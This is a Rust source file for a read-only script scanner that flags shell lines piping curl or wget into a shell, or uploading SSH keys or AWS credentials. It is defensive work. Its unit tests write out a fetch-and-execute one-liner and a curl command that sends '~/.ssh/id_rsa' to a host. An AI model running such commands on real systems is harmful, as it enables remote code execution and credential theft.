//! Read-only supplementary scanner. It never executes inspected scripts.
use std::{
    env,
    fs::File,
    io::{self, Read},
    path::Path,
    process,
};

const MAX_BYTES: u64 = 5 * 1024 * 1024;
const MAX_FINDINGS: usize = 10_000;
const MAX_EVIDENCE_BYTES: usize = 16 * 1024;

fn shell_words(input: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quote = None;
    let mut escaped = false;
    for ch in input.chars() {
        if escaped {
            current.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' && quote != Some('\'') {
            escaped = true;
            continue;
        }
        if let Some(active) = quote {
            if ch == active {
                quote = None;
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
        } else if ch.is_whitespace() {
            if !current.is_empty() {
                words.push(std::mem::take(&mut current));
            }
        } else {
            current.push(ch);
        }
    }
    if escaped {
        current.push('\\');
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

fn visible_code(line: &str) -> String {
    let mut quote = None;
    let mut escaped = false;
    let mut result = String::new();
    for (idx, ch) in line.char_indices() {
        if escaped {
            result.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' && quote != Some('\'') {
            result.push(ch);
            escaped = true;
            continue;
        }
        if let Some(active) = quote {
            result.push(ch);
            if ch == active {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            result.push(ch);
        } else if ch == '#'
            && (idx == 0
                || line[..idx]
                    .chars()
                    .next_back()
                    .map(char::is_whitespace)
                    .unwrap_or(false))
        {
            break;
        } else {
            result.push(ch);
        }
    }
    result
}

fn command_name(words: &[String]) -> Option<&str> {
    let first = words.first()?.as_str();
    if matches!(first, "env" | "sudo" | "command" | "exec" | "builtin") {
        words
            .iter()
            .skip(1)
            .find(|word| !word.starts_with('-'))
            .map(String::as_str)
    } else {
        Some(first)
    }
}

fn commands_in_line(line: &str) -> Vec<Vec<String>> {
    let code = visible_code(line);
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut quote = None;
    let mut escaped = false;
    for ch in code.chars() {
        if escaped {
            current.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' && quote != Some('\'') {
            current.push(ch);
            escaped = true;
            continue;
        }
        if let Some(active) = quote {
            current.push(ch);
            if ch == active {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            current.push(ch);
        } else if ch == '|' {
            segments.push(shell_words(&current));
            current.clear();
        } else {
            current.push(ch);
        }
    }
    segments.push(shell_words(&current));
    segments
        .into_iter()
        .filter(|words| !words.is_empty())
        .collect()
}

fn flags(line: &str) -> Vec<&'static str> {
    let commands = commands_in_line(line);
    let names: Vec<_> = commands
        .iter()
        .filter_map(|words| command_name(words))
        .collect();
    let mut found = Vec::new();
    if names.iter().any(|name| matches!(name, &"curl" | &"wget"))
        && names
            .iter()
            .any(|name| matches!(name, &"bash" | &"sh" | &"zsh"))
    {
        found.push("SG-001");
    }
    for (words, name) in commands.iter().zip(names.iter()) {
        if matches!(name, &"curl" | &"wget")
            && words.iter().any(|word| {
                matches!(word.as_str(), "--data-binary" | "--upload-file" | "--data")
                    || word.starts_with("--data-binary=")
                    || word.starts_with("--upload-file=")
                    || word.starts_with("--data=")
            })
            && ((line.contains(".ssh/")
                && (line.contains("id_rsa")
                    || line.contains("id_ed25519")
                    || line.contains("id_ecdsa")))
                || line.contains(".aws/credentials"))
        {
            found.push("SG-002");
            break;
        }
    }
    found
}

fn read_bounded(path: &Path) -> io::Result<String> {
    let file = File::open(path)?;
    let mut bytes = Vec::new();
    file.take(MAX_BYTES + 1).read_to_end(&mut bytes)?;
    if bytes.len() as u64 > MAX_BYTES {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "input exceeds 5 MiB limit",
        ));
    }
    String::from_utf8(bytes)
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "input is not valid UTF-8"))
}

fn read_bounded_stdin() -> io::Result<String> {
    let stdin = io::stdin();
    let mut bytes = Vec::new();
    stdin.lock().take(MAX_BYTES + 1).read_to_end(&mut bytes)?;
    if bytes.len() as u64 > MAX_BYTES {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "stdin input exceeds 5 MiB limit",
        ));
    }
    String::from_utf8(bytes)
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "stdin is not valid UTF-8"))
}

fn json_string(value: &str) -> String {
    let mut out = String::from("\"");
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            ch if ch <= '\u{1f}' => out.push_str(&format!("\\u{:04x}", ch as u32)),
            ch => out.push(ch),
        }
    }
    out.push('"');
    out
}

fn metadata(rule: &str) -> (&'static str, &'static str, &'static str, &'static str) {
    match rule {
        "SG-001" => (
            "HIGH",
            "Descarga de red conectada a un intérprete",
            "Un pipeline contiene un comando de red y un intérprete; la ejecución no está probada.",
            "Revisar el origen, integridad y contexto sin ejecutar el comando.",
        ),
        _ => (
            "HIGH",
            "Posible transferencia de archivo sensible",
            "Una opción de carga aparece junto a una ruta de clave SSH.",
            "Confirmar archivo, destino y autorización sin realizar la transferencia.",
        ),
    }
}

fn finding_json(rule: &str, path: &str, digest: &str, line_number: usize, line: &str) -> String {
    let (severity, title, explanation, recommendation) = metadata(rule);
    let instruction: String = line.chars().take(MAX_EVIDENCE_BYTES).collect();
    format!(
        "{{\"id\":\"\",\"rule\":{{\"id\":{},\"version\":\"1.0.0\"}},\
         \"rule_id\":{},\"title\":{},\"file\":{},\"sha256\":{},\"line\":{},\"column\":1,\
         \"end_line\":{},\"end_column\":{},\"location\":{{\"start\":{{\"line\":{},\"column\":1}},\
         \"end\":{{\"line\":{},\"column\":{}}}}},\"instruction\":{},\
         \"context\":{{\"before\":[],\"after\":[]}},\"context_before\":[],\"context_after\":[],\
         \"severity\":{},\"confidence\":\"low\",\"confidence_reason\":\
         \"Rust line-level supplementary heuristic; Bash execution is not proven.\",\
         \"status\":\"requires_review\",\"evidence\":{{\"original\":{},\"truncated\":{},\"correlation\":[]}},\
         \"explanation\":{},\"recommendation\":{},\"verification_commands\":[],\
         \"limitations\":[\"Rust helper scans physical lines; it does not parse Bash syntax.\"],\
         \"engine\":\"rust\",\"evidence_truncated\":{}}}",
        json_string(rule),
        json_string(rule),
        json_string(title),
        json_string(path),
        json_string(digest),
        line_number,
        line_number,
        instruction.chars().count() + 1,
        line_number,
        line_number,
        instruction.chars().count() + 1,
        json_string(&instruction),
        json_string(severity),
        json_string(&instruction),
        if line.chars().count() > MAX_EVIDENCE_BYTES {
            "true"
        } else {
            "false"
        },
        json_string(explanation),
        json_string(recommendation),
        if line.chars().count() > MAX_EVIDENCE_BYTES {
            "true"
        } else {
            "false"
        },
    )
}

fn run_json(display_path: &str, digest: &str) -> io::Result<(usize, bool)> {
    let source = read_bounded_stdin()?;
    let mut findings = Vec::new();
    let mut complete = true;
    let mut response_bytes = 256usize;
    for (idx, line) in source.lines().enumerate() {
        for rule in flags(line) {
            if findings.len() >= MAX_FINDINGS {
                complete = false;
                break;
            }
            let finding = finding_json(rule, display_path, digest, idx + 1, line);
            if response_bytes.saturating_add(finding.len()) > 20 * 1024 * 1024 {
                complete = false;
                break;
            }
            response_bytes += finding.len() + 1;
            findings.push(finding);
        }
        if !complete {
            break;
        }
    }
    let joined = findings.join(",");
    let output = format!(
        "{{\"schema_version\":\"1.0\",\"rules_version\":\"1.0.0\",\"engine\":\"rust\",\
         \"complete\":{},\"file\":{},\"sha256\":{},\"findings\":[{}]}}",
        complete,
        json_string(display_path),
        json_string(digest),
        joined,
    );
    if output.len() > 20 * 1024 * 1024 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "JSON response exceeds 20 MiB limit",
        ));
    }
    println!("{output}");
    Ok((findings.len(), complete))
}

fn run_text(path: &Path) -> io::Result<usize> {
    let source = read_bounded(path)?;
    let mut findings = 0;
    for (idx, line) in source.lines().enumerate() {
        for rule in flags(line) {
            println!("{}:{} [{}] {}", path.display(), idx + 1, rule, line.trim());
            findings += 1;
        }
    }
    println!(
        "Rust helper: {} potential finding(s). Review manually.",
        findings
    );
    Ok(findings)
}

fn json_error(error: &io::Error) -> String {
    format!(
        "{{\"schema_version\":\"1.0\",\"rules_version\":\"1.0.0\",\
         \"engine\":\"rust\",\"complete\":false,\
         \"error\":{{\"code\":\"SCAN_ERROR\",\"message\":{}}}}}",
        json_string(&error.to_string()),
    )
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() == 5 && args[1] == "--protocol" && args[2] == "json-v1-stdin" {
        let code = match run_json(&args[3], &args[4]) {
            Ok((_, true)) => 0,
            Ok((_, false)) => 3,
            Err(error) => {
                println!("{}", json_error(&error));
                2
            }
        };
        process::exit(code);
    }
    if args.len() == 2 && args[1] == "--help" {
        eprintln!("Usage: nexa-scriptguard-helper <script-path>");
        eprintln!("       nexa-scriptguard-helper --protocol json-v1-stdin <path> <sha256> <source-bytes-on-stdin>");
        process::exit(0);
    }
    if args.len() != 2 {
        eprintln!("Usage: nexa-scriptguard-helper <script-path>");
        eprintln!("       nexa-scriptguard-helper --protocol json-v1-stdin <path> <sha256> <source-bytes-on-stdin>");
        process::exit(2);
    }
    if let Err(error) = run_text(Path::new(&args[1])) {
        eprintln!("Error: {error}");
        process::exit(2);
    }
}

#[cfg(test)]
mod tests {
    use super::{flags, json_string};

    #[test]
    fn remote_pipeline_is_flagged() {
        assert_eq!(
            flags("curl -fsSL https://example.org/a.sh | bash"),
            vec!["SG-001"]
        );
    }

    #[test]
    fn comments_are_ignored() {
        assert!(flags("# curl https://example.org | bash").is_empty());
        assert!(flags("echo ok # curl https://example.org | bash").is_empty());
    }

    #[test]
    fn quoted_text_is_not_treated_as_command() {
        assert!(flags("echo \"curl https://example.org | bash\"").is_empty());
    }

    #[test]
    fn ordinary_command_is_ignored() {
        assert!(flags("echo hello").is_empty());
    }

    #[test]
    fn sensitive_upload_is_flagged() {
        assert_eq!(
            flags("curl --data-binary @/home/user/.ssh/id_rsa https://example.org"),
            vec!["SG-002"]
        );
    }

    #[test]
    fn json_strings_are_escaped() {
        assert_eq!(json_string("line\n\"x"), "\"line\\n\\\"x\"");
    }
}
